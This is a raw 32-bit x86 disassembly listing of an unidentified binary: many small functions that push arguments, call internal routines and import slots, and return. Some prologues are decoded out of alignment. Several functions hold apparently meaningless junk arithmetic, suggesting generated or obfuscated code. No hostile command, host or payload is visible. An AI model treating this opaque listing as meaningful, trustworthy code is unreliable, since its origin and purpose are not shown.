  4d10eb:	call   0x4d0f30
  4d10f0:	add    esp,0x4
  4d10f3:	push   ebx
  4d10f4:	push   ecx
  4d10f5:	push   ecx
  4d10f6:	call   0x4d0ab4
  4d10fb:	add    esp,0x8
  4d10fe:	pop    ebx
  4d10ff:	push   0x0
  4d1101:	call   0x4d145c
  4d1106:	add    esp,0x4
  4d1109:	add    esp,0x2c
  4d110c:	pop    ebp
  4d110d:	ret    
  4d110e:	add    BYTE PTR [eax],al
  4d1110:	pop    edi
  4d1111:	call   DWORD PTR ds:0x4d202c
  4d1117:	call   edi
  4d1119:	add    BYTE PTR [eax],al
  4d111b:	add    BYTE PTR [edi-0x1],bl
  4d111e:	adc    eax,0x4d2068
  4d1123:	call   edi
  4d1125:	add    BYTE PTR [eax],al
  4d1127:	add    BYTE PTR [edi-0x1],bl
  4d112a:	adc    eax,0x4d2058
  4d112f:	call   edi
  4d1131:	add    BYTE PTR [eax],al
  4d1133:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1139:	sub    esp,0x20
  4d113c:	mov    edx,0x4d31cc
  4d1141:	xor    eax,DWORD PTR [edx+0x14]
  4d1144:	push   edx
  4d1145:	push   DWORD PTR [edx+0xe0]
  4d114b:	push   DWORD PTR [edx+0x14c]
  4d1151:	push   DWORD PTR [edx+0x198]
  4d1157:	call   0x4d0994
  4d115c:	add    esp,0xc
  4d115f:	pop    edx
  4d1160:	push   edx
  4d1161:	mov    ebx,0x0
  4d1166:	push   ebx
  4d1167:	call   0x4d0938
  4d116c:	add    esp,0x4
  4d116f:	pop    edx
  4d1170:	push   edx
  4d1171:	call   0x4d0fec
  4d1176:	add    esp,0x4
  4d1179:	pop    edx
  4d117a:	add    esp,0x20
  4d117d:	pop    ebp
  4d117e:	ret    
  4d117f:	add    BYTE PTR [edi-0x1],bl
  4d1182:	adc    eax,0x4d2030
  4d1187:	call   edi
  4d1189:	add    BYTE PTR [eax],al
  4d118b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1191:	sub    esp,0x38
  4d1194:	lea    edi,ds:0x4d315c
  4d119a:	add    esi,DWORD PTR [ebp-0x10]
  4d119d:	push   edi
  4d119e:	push   DWORD PTR [edi+0x15c]
  4d11a4:	push   edx
  4d11a5:	push   edx
  4d11a6:	push   DWORD PTR [edi+0xc]
  4d11a9:	call   0x4d0f48
  4d11ae:	add    esp,0x10
  4d11b1:	pop    edi
  4d11b2:	push   edi
  4d11b3:	call   0x4d1180
  4d11b8:	add    esp,0x4
  4d11bb:	pop    edi
  4d11bc:	push   edi
  4d11bd:	push   0x0
  4d11bf:	call   0x4d0f30
  4d11c4:	add    esp,0x4
  4d11c7:	pop    edi
  4d11c8:	add    esp,0x38
  4d11cb:	pop    ebp
  4d11cc:	ret    
  4d11cd:	add    BYTE PTR [eax],al
  4d11cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11d5:	sub    esp,0x58
  4d11d8:	lea    ecx,ds:0x4d3180
  4d11de:	adc    DWORD PTR [ecx-0x70],0xffffffe9
  4d11e2:	push   ecx
  4d11e3:	push   ebx
  4d11e4:	push   eax
  4d11e5:	push   edx
  4d11e6:	call   0x4d1244
  4d11eb:	add    esp,0xc
  4d11ee:	pop    ecx
  4d11ef:	push   ecx
  4d11f0:	call   0x4d0fec
  4d11f5:	add    esp,0x4
  4d11f8:	pop    ecx
  4d11f9:	push   ecx
  4d11fa:	call   0x4d0fec
  4d11ff:	add    esp,0x4
  4d1202:	pop    ecx
  4d1203:	add    esp,0x58
  4d1206:	pop    ebp
  4d1207:	ret    
  4d1208:	mov    edi,edi
  4d120a:	push   ebp
  4d120b:	mov    ebp,esp
  4d120d:	sub    esp,0x1c
  4d1210:	lea    edi,ds:0x4d302c
  4d1216:	sub    ebx,eax
  4d1218:	push   edi
  4d1219:	push   0x0
  4d121b:	call   0x4d111c
  4d1220:	add    esp,0x4
  4d1223:	pop    edi
  4d1224:	push   edi
  4d1225:	push   ecx
  4d1226:	push   ebx
  4d1227:	call   0x4d1378
  4d122c:	add    esp,0x8
  4d122f:	pop    edi
  4d1230:	push   edi
  4d1231:	push   0x0
  4d1233:	call   0x4d0794
  4d1238:	add    esp,0x4
  4d123b:	pop    edi
  4d123c:	add    esp,0x1c
  4d123f:	pop    ebp
  4d1240:	ret    
  4d1241:	add    BYTE PTR [eax],al
  4d1243:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1249:	sub    esp,0x24
  4d124c:	mov    ebx,0x4d3144
  4d1251:	sbb    esi,DWORD PTR [ebp-0x20]
  4d1254:	push   ebx
  4d1255:	push   DWORD PTR [ebx+0x140]
  4d125b:	push   DWORD PTR [ebx+0x1c8]
  4d1261:	push   ecx
  4d1262:	push   DWORD PTR [ebx+0x17c]
  4d1268:	call   0x4d13cc
  4d126d:	add    esp,0x10
  4d1270:	pop    ebx
  4d1271:	mov    edx,0x0
  4d1276:	push   edx
  4d1277:	call   0x4d0a00
  4d127c:	add    esp,0x4
  4d127f:	call   0x4d0fec
  4d1284:	add    esp,0x4
  4d1287:	add    esp,0x24
  4d128a:	pop    ebp
  4d128b:	ret    
  4d128c:	pop    edi
  4d128d:	call   DWORD PTR ds:0x4d2054
  4d1293:	call   edi
  4d1295:	add    BYTE PTR [eax],al
  4d1297:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d129d:	sub    esp,0x50
  4d12a0:	mov    esi,0x4d3098
  4d12a5:	cmp    esi,0x6938
  4d12ab:	jb     0x4d129b
  4d12ad:	mov    ecx,0x0
  4d12b2:	push   ecx
  4d12b3:	call   0x4d0f30
  4d12b8:	add    esp,0x4
  4d12bb:	push   esi
  4d12bc:	push   ecx
  4d12bd:	push   DWORD PTR [esi+0x7c]
  4d12c0:	push   DWORD PTR [esi+0xcc]
  4d12c6:	call   0x4d1048
  4d12cb:	add    esp,0xc
  4d12ce:	pop    esi
  4d12cf:	push   0x0
  4d12d1:	call   0x4d0f3c
  4d12d6:	add    esp,0x4
  4d12d9:	add    esp,0x50
  4d12dc:	pop    ebp
  4d12dd:	ret    
  4d12de:	add    BYTE PTR [eax],al
  4d12e0:	mov    edi,edi
  4d12e2:	push   ebp
  4d12e3:	mov    ebp,esp
  4d12e5:	sub    esp,0x54
  4d12e8:	mov    edi,0x4d3064
  4d12ed:	or     DWORD PTR [ebp-0x3c],0xffffe385
  4d12f4:	push   edi
  4d12f5:	push   DWORD PTR [edi+0x20]
  4d12f8:	push   ebx
  4d12f9:	push   edx
  4d12fa:	call   0x4d1480
  4d12ff:	add    esp,0xc
  4d1302:	pop    edi
  4d1303:	push   edi
  4d1304:	lea    ecx,[edi-0x64]
  4d1307:	push   ecx
  4d1308:	call   0x4d0ed8
  4d130d:	add    esp,0x4
  4d1310:	test   eax,eax
  4d1312:	jne    0x4d1304
  4d1314:	pop    edi
  4d1315:	push   edi
  4d1316:	mov    edi,0x0
  4d131b:	push   edi
  4d131c:	call   0x4d0938
  4d1321:	add    esp,0x4
  4d1324:	pop    edi
  4d1325:	add    esp,0x54
  4d1328:	pop    ebp
  4d1329:	ret    
  4d132a:	add    BYTE PTR [eax],al
  4d132c:	mov    edi,edi
  4d132e:	push   ebp
  4d132f:	mov    ebp,esp
  4d1331:	sub    esp,0x60
  4d1334:	lea    ebx,ds:0x4d3090
  4d133a:	adc    DWORD PTR [ebx+0x128],eax
  4d1340:	mov    eax,0x0
  4d1345:	push   eax
  4d1346:	call   0x4d09e8
  4d134b:	add    esp,0x4
  4d134e:	push   ebx
  4d134f:	push   DWORD PTR [ebx+0x108]
  4d1355:	push   DWORD PTR [ebx+0x1d4]
  4d135b:	push   edi
  4d135c:	call   0x4d1298
  4d1361:	add    esp,0xc
  4d1364:	pop    ebx
  4d1365:	mov    ecx,0x0
  4d136a:	push   ecx
  4d136b:	call   0x4d0794
  4d1370:	add    esp,0x4
  4d1373:	add    esp,0x60
  4d1376:	pop    ebp
  4d1377:	ret    
  4d1378:	mov    edi,edi
  4d137a:	push   ebp
  4d137b:	mov    ebp,esp
  4d137d:	sub    esp,0x5c
  4d1380:	mov    esi,0x4d3064
  4d1385:	cmp    esi,0x31e5
  4d138b:	je     0x4d137b
  4d138d:	push   0x0
  4d138f:	call   0x4d111c
  4d1394:	add    esp,0x4
  4d1397:	push   esi
  4d1398:	push   DWORD PTR [esi+0x198]
  4d139e:	push   DWORD PTR [esi+0x58]
  4d13a1:	push   ebx
  4d13a2:	call   0x4d132c
  4d13a7:	add    esp,0xc
  4d13aa:	pop    esi
  4d13ab:	mov    ebx,0x0
  4d13b0:	push   ebx
  4d13b1:	call   0x4d145c
  4d13b6:	add    esp,0x4
  4d13b9:	add    esp,0x5c
  4d13bc:	pop    ebp
  4d13bd:	ret    
  4d13be:	add    BYTE PTR [eax],al
  4d13c0:	pop    edi
  4d13c1:	call   DWORD PTR ds:0x4d20a0
  4d13c7:	call   edi
  4d13c9:	add    BYTE PTR [eax],al
  4d13cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13d1:	sub    esp,0x28
  4d13d4:	lea    edx,ds:0x4d30e4
  4d13da:	xor    eax,0x41
  4d13dd:	push   edx
  4d13de:	push   DWORD PTR [edx+0x110]
  4d13e4:	push   ebx
  4d13e5:	push   DWORD PTR [edx+0x114]
  4d13eb:	call   0x4d0810
  4d13f0:	add    esp,0xc
  4d13f3:	pop    edx
  4d13f4:	push   edx
  4d13f5:	mov    ecx,0x0
  4d13fa:	push   ecx
  4d13fb:	call   0x4d0f3c
  4d1400:	add    esp,0x4
  4d1403:	pop    edx
  4d1404:	push   edx
  4d1405:	mov    edi,0x0
  4d140a:	push   edi
  4d140b:	call   0x4d0794
  4d1410:	add    esp,0x4
  4d1413:	pop    edx
  4d1414:	add    esp,0x28
  4d1417:	pop    ebp
  4d1418:	ret    
  4d1419:	add    BYTE PTR [eax],al
  4d141b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1421:	sub    esp,0x3c
  4d1424:	mov    ecx,0x4d3018
  4d1429:	add    DWORD PTR [ebp-0x2c],0x4e
  4d142d:	push   ecx
  4d142e:	push   eax
  4d142f:	push   edx
  4d1430:	call   0x4d1090
  4d1435:	add    esp,0x8
  4d1438:	pop    ecx
  4d1439:	push   ecx
  4d143a:	mov    edi,0x0
  4d143f:	push   edi
  4d1440:	call   0x4d09e8
  4d1445:	add    esp,0x4
  4d1448:	pop    ecx
  4d1449:	push   ecx
  4d144a:	push   0x0
  4d144c:	call   0x4d06ec
  4d1451:	add    esp,0x4
  4d1454:	pop    ecx
  4d1455:	add    esp,0x3c
  4d1458:	pop    ebp
  4d1459:	ret    
  4d145a:	add    BYTE PTR [eax],al
  4d145c:	pop    edi
  4d145d:	call   DWORD PTR ds:0x4d2084
  4d1463:	call   edi
  4d1465:	add    BYTE PTR [eax],al
  4d1467:	add    BYTE PTR [edi-0x1],bl
  4d146a:	adc    eax,0x4d2060
  4d146f:	call   edi
  4d1471:	add    BYTE PTR [eax],al
  4d1473:	add    BYTE PTR [edi-0x1],bl
  4d1476:	adc    eax,0x4d2014
  4d147b:	call   edi
  4d147d:	add    BYTE PTR [eax],al
  4d147f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1485:	sub    esp,0x28
  4d1488:	lea    ecx,[edi-0x4c]
  4d148b:	adc    ebx,DWORD PTR [ebp-0xc]
  4d148e:	push   ecx
  4d148f:	lea    esi,[ecx-0x18]
  4d1492:	push   esi
  4d1493:	call   0x4d0ed8
  4d1498:	add    esp,0x4
  4d149b:	test   eax,eax
  4d149d:	jne    0x4d148f
  4d149f:	pop    ecx
  4d14a0:	push   ecx
  4d14a1:	push   ebx
  4d14a2:	push   DWORD PTR [ecx+0x1e8]
  4d14a8:	push   DWORD PTR [ecx+0x18]
  4d14ab:	call   0x4d0af8
  4d14b0:	add    esp,0xc
  4d14b3:	pop    ecx
  4d14b4:	push   ecx
  4d14b5:	push   0x0
  4d14b7:	call   0x4d0938
  4d14bc:	add    esp,0x4
  4d14bf:	pop    ecx
  4d14c0:	add    esp,0x28
  4d14c3:	pop    ebp
  4d14c4:	ret    
  4d14c5:	add    BYTE PTR [eax],al
  4d14c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14cd:	sub    esp,0x5c
  4d14d0:	mov    ecx,0x4d3090
  4d14d5:	adc    ebx,0xffffffa5
  4d14d8:	push   ecx
  4d14d9:	mov    edx,0x0
  4d14de:	push   edx
  4d14df:	call   0x4d0938
  4d14e4:	add    esp,0x4
  4d14e7:	pop    ecx
  4d14e8:	push   ecx
  4d14e9:	push   edi
  4d14ea:	push   DWORD PTR [ecx+0x50]
  4d14ed:	push   DWORD PTR [ecx+0x1a4]
  4d14f3:	push   DWORD PTR [ecx+0x88]
  4d14f9:	call   0x4d118c
  4d14fe:	add    esp,0x10
  4d1501:	pop    ecx
  4d1502:	push   ecx
  4d1503:	mov    ebx,0x0
  4d1508:	push   ebx
  4d1509:	call   0x4d0f30
  4d150e:	add    esp,0x4
  4d1511:	pop    ecx
  4d1512:	add    esp,0x5c
  4d1515:	pop    ebp
  4d1516:	ret    
  4d1517:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d151d:	sub    esp,0x44
  4d1520:	lea    eax,[ebx+0x11c]
  4d1526:	adc    ecx,ebx
  4d1528:	push   eax
  4d1529:	push   edx
  4d152a:	push   DWORD PTR [eax+0x2c]
  4d152d:	call   0x4d1208
  4d1532:	add    esp,0x8
  4d1535:	pop    eax
  4d1536:	push   eax
  4d1537:	push   0x0
  4d1539:	call   0x4d145c
  4d153e:	add    esp,0x4
  4d1541:	pop    eax
  4d1542:	push   eax
  4d1543:	push   0x0
  4d1545:	call   0x4d0f30
  4d154a:	add    esp,0x4
  4d154d:	pop    eax
  4d154e:	add    esp,0x44
  4d1551:	pop    ebp
  4d1552:	ret    
  4d1553:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1559:	sub    esp,0x2c
  4d155c:	lea    esi,[eax-0x13c]
  4d1562:	or     eax,0xffffffac
  4d1565:	push   esi
  4d1566:	push   ebx
  4d1567:	push   edx
  4d1568:	push   edx
  4d1569:	call   0x4d12e0
  4d156e:	add    esp,0xc
  4d1571:	pop    esi
  4d1572:	mov    ecx,0x0
  4d1577:	push   ecx
  4d1578:	call   0x4d0938
  4d157d:	add    esp,0x4
  4d1580:	mov    ecx,0x0
  4d1585:	push   ecx
  4d1586:	call   0x4d09e8
  4d158b:	add    esp,0x4
  4d158e:	add    esp,0x2c
  4d1591:	pop    ebp
  4d1592:	ret    
  4d1593:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1599:	sub    esp,0x24
  4d159c:	lea    edi,[eax+0x60]
  4d159f:	sbb    esi,0x2
  4d15a2:	push   edi
  4d15a3:	push   DWORD PTR [edi+0x34]
  4d15a6:	push   ebx
  4d15a7:	push   esi
  4d15a8:	call   0x4d0c44
  4d15ad:	add    esp,0xc
  4d15b0:	pop    edi
  4d15b1:	push   edi
  4d15b2:	mov    edi,0x0
  4d15b7:	push   edi
  4d15b8:	call   0x4d0f30
  4d15bd:	add    esp,0x4
  4d15c0:	pop    edi
  4d15c1:	push   edi
  4d15c2:	push   0x0
  4d15c4:	call   0x4d09e8
  4d15c9:	add    esp,0x4
  4d15cc:	pop    edi
  4d15cd:	add    esp,0x24
  4d15d0:	pop    ebp
  4d15d1:	ret    
	...
